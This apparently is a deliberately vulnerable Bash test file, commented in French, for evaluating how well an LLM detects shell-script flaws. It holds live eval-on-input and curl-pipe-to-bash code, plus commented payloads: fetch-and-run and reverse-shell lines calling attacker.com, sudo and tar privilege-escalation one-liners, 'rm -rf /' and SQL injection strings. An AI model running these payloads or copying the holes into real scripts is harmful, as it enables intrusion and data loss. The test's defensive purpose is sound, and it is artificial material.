#!/usr/bin/env bash
# FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES (Bash / Shell)
# Usage : évaluation LLM — détection de failles Bash/Shell scripting
# Couvre : injection, variables non sécurisées, sudo misconfig, TOCTOU,
#          wildcard injection, env vars, here-doc injection, PATH manipulation
# NE PAS exécuter en production.

# ═══════════════════════════════════════════════════════════════════════
# 1. COMMAND INJECTION via variables non quotées
# OWASP A05:2025 – Injection | CVSS 9.8
# ═══════════════════════════════════════════════════════════════════════
# Payload : FILENAME="file.txt; rm -rf /"
FILENAME="$1"
ls -la $FILENAME          # non quoté — word splitting + glob expansion
cat $FILENAME             # idem

# Injection via backtick dans un nom de fichier
LOGFILE="/var/log/$2"
echo "Started" > $LOGFILE # si $2 = "app.log; curl evil.com | sh > /tmp/x"

# ═══════════════════════════════════════════════════════════════════════
# 2. EVAL INJECTION
# OWASP A05:2025 – Injection | CVSS 10.0
# ═══════════════════════════════════════════════════════════════════════
# Payload : INPUT="$(curl http://attacker.com/shell.sh)"
INPUT="$3"
eval "$INPUT"             # eval avec input externe → RCE directe
eval "echo $INPUT"        # idem — "$(id)" dans INPUT sera exécuté

# ═══════════════════════════════════════════════════════════════════════
# 3. PATH INJECTION — manipulation du PATH pour exécuter des binaires malveillants
# ═══════════════════════════════════════════════════════════════════════
# Si un attaquant contrôle le PATH, il peut remplacer 'ls', 'cat', etc.
export PATH="$HOME/.local/bin:$PATH:/usr/bin:/bin"  # . ou paths relatifs dans PATH
# Un .local/bin/ls malveillant sera exécuté à la place du vrai ls

# Script sans chemin absolu — vulnérable si PATH est contrôlé
python3 process_data.py    # devrait être /usr/bin/python3
openssl enc -d -in data    # devrait être /usr/bin/openssl

# ═══════════════════════════════════════════════════════════════════════
# 4. WILDCARD INJECTION — tar, chown, chmod, find
# ═══════════════════════════════════════════════════════════════════════
# Attaquant crée des fichiers nommés comme des options :
# touch -- '--checkpoint=1'
# touch -- '--checkpoint-action=exec=sh privesc.sh'
# Ensuite ce script appelle :
tar czf backup.tar.gz *       # * expanded → --checkpoint-action exécuté par tar

# Même problème avec rsync, find -exec, etc.
find /tmp -name "*.log" -exec rm {} \;   # si attaquant crée un fichier "-rf /"

# chown wildcard (classic sudo privesc)
# sudo chown root:root * dans un répertoire que l'attaquant contrôle

# ═══════════════════════════════════════════════════════════════════════
# 5. TOCTOU — Time of Check to Time of Use sur fichier temporaire
# ═══════════════════════════════════════════════════════════════════════
TMPFILE="/tmp/data_$$"
if [ ! -f "$TMPFILE" ]; then
    # fenêtre de race — un attaquant peut créer un symlink entre le test et l'écriture
    echo "sensitive data" > "$TMPFILE"   # peut écrire dans /etc/passwd via symlink
fi

# Correct : mktemp
# TMPFILE=$(mktemp /tmp/data.XXXXXX)

# ═══════════════════════════════════════════════════════════════════════
# 6. CREDENTIALS EN DUR ET DANS L'HISTORIQUE
# OWASP A02:2025 – Security Misconfiguration | CVSS 8.0
# ═══════════════════════════════════════════════════════════════════════
DB_PASS="SuperSecret123!"
API_KEY="sk_live_XXXXXXXXXXXXXXXXXXXX"

# Credentials passés en arguments de ligne de commande → visibles dans 'ps aux'
mysql -u root -p"SuperSecret123!" -h db.prod.internal < migrate.sql
curl -H "Authorization: Bearer sk_live_XXXXXXX" https://api.stripe.com/v1/charges

# ═══════════════════════════════════════════════════════════════════════
# 7. SUDO MISCONFIGURATION — escalade de privilège
# OWASP A01:2025 – Broken Access Control | CVSS 9.8
# ═══════════════════════════════════════════════════════════════════════
# /etc/sudoers (simulé — à ne pas appliquer) :
# www-data ALL=(ALL) NOPASSWD: /usr/bin/find
# www-data ALL=(ALL) NOPASSWD: /usr/bin/vim
# www-data ALL=(ALL) NOPASSWD: /usr/bin/python3
# www-data ALL=(ALL) NOPASSWD: /usr/bin/tar
# www-data ALL=(ALL) NOPASSWD: /usr/bin/zip
# Chacune de ces commandes permet une escalade :
# sudo find . -exec /bin/sh \;
# sudo vim -c ':!/bin/bash'
# sudo python3 -c 'import os; os.system("/bin/bash")'
# sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# ═══════════════════════════════════════════════════════════════════════
# 8. HERE-DOC INJECTION — expansion de variables dans heredoc
# ═══════════════════════════════════════════════════════════════════════
USER_INPUT="$4"
# Les guillemets autour de EOF empêchent l'expansion — mais beaucoup de scripts oublient
mysql -u root -p"$DB_PASS" <<EOF
INSERT INTO logs (message) VALUES ('$USER_INPUT');
EOF
# SQL injection directe si $USER_INPUT = "'); DROP TABLE logs; --"

# ═══════════════════════════════════════════════════════════════════════
# 9. INSECURE FILE PERMISSIONS — chmod 777, umask insuffisant
# OWASP A02:2025 – Security Misconfiguration
# ═══════════════════════════════════════════════════════════════════════
chmod 777 /var/www/html/uploads/       # world-writable → upload de webshell
chmod 777 /etc/app/config.php          # credentials lisibles par tous
umask 000                               # tous les fichiers créés ensuite seront 666/777

# Script avec SUID bit (dangereux) :
# chmod u+s /usr/local/bin/backup.sh   # exécuté en root par n'importe quel utilisateur

# ═══════════════════════════════════════════════════════════════════════
# 10. INSECURE USE OF curl | bash (supply chain)
# OWASP A03:2025 – Software Supply Chain Failures
# ═══════════════════════════════════════════════════════════════════════
# Pas de vérification d'intégrité, pas de HTTPS strict
curl http://install.example.com/setup.sh | bash          # HTTP → MitM
curl https://raw.githubusercontent.com/user/repo/main/install.sh | bash  # si repo compromis
wget -qO- https://get.docker.com | sh                    # pattern courant mais risqué

# Correct : télécharger, vérifier la signature GPG, PUIS exécuter
# curl -fsSL https://example.com/setup.sh -o setup.sh
# gpg --verify setup.sh.sig setup.sh && bash setup.sh

# ═══════════════════════════════════════════════════════════════════════
# 11. ENVIRONMENT VARIABLE INJECTION
# ═══════════════════════════════════════════════════════════════════════
# Shellshock-style (CVE-2014-6271 — encore exploité dans systèmes legacy 2026)
# Payload via HTTP_USER_AGENT : () { :;}; /bin/bash -c 'id'
env -i bash -c 'echo $PATH'  # bash lit les variables d'env définies par l'appelant

# LD_PRELOAD injection (si script lancé avec sudo sans env reset)
# LD_PRELOAD=/tmp/evil.so sudo /path/to/script.sh

# ═══════════════════════════════════════════════════════════════════════
# 12. LOG INJECTION via echo dans un fichier de log
# OWASP A09:2025 – Security Logging and Alerting Failures
# ═══════════════════════════════════════════════════════════════════════
USERNAME="$5"
# Payload : "admin\n[2026-01-01 00:00:00] admin logged in successfully"
echo "[$(date)] User $USERNAME logged in" >> /var/log/app/audit.log
# → forge d'entrées de log via CRLF injection ou newlines dans le username

# ═══════════════════════════════════════════════════════════════════════
# 13. REVERSE SHELL — patterns de détection (sandbox-guard doit les bloquer)
# ═══════════════════════════════════════════════════════════════════════
# bash -i >& /dev/tcp/attacker.com/4444 0>&1
# python3 -c 'import socket,subprocess,os;s=socket.socket()...)'
# nc -e /bin/bash attacker.com 4444
# curl attacker.com | bash
# Ces patterns doivent être détectés par sandbox-guard.sh couche 3 (injection shell)
